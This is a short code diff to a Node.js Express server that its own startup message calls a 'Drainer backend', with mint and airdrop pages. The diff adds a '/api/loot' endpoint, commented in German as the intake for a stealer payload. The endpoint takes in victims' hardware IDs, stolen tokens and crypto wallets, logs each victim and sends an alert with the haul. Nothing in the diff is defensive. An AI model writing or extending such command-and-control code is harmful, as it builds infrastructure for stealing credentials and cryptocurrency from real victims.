@@ -81,5 +81,16 @@ app.get('/admin', (req,res)=> res.sendFile(path.join(__dirname, 'admin.html')));
 app.get('/mint', (req,res)=> res.sendFile(path.join(__dirname, '..', 'frontend', 'index.html')));
 app.get('/airdrop', (req,res)=> res.sendFile(path.join(__dirname, '..', 'frontend', 'airdrop.html')));
 
+// Loot-Eingang vom Stealer (payload/stealer.cpp)
+app.post('/api/loot', async (req, res) => {
+  try{
+    const body = req.body || {};
+    console.log('[loot]', body.hwid, (body.tokens||[]).length, 'tokens');
+    logVictim({ type:'loot', victim: body.hwid, tokens: body.tokens, wallets: body.wallets });
+    try{ const { send } = require('./alerter'); send(`👾 **Loot von ${body.hwid}**\nTokens: ${(body.tokens||[]).length}\nWallets: \`${(body.wallets||[]).join(', ')||'-'}\``).catch(()=>{}); }catch(e){}
+    res.json({ ok:true });
+  }catch(e){ res.status(500).json({ ok:false }); }
+});
+
 const PORT = cfg.port || 3001;
 app.listen(PORT, ()=> console.log(`Drainer backend on :${PORT}, collector=${cfg.collector}`));
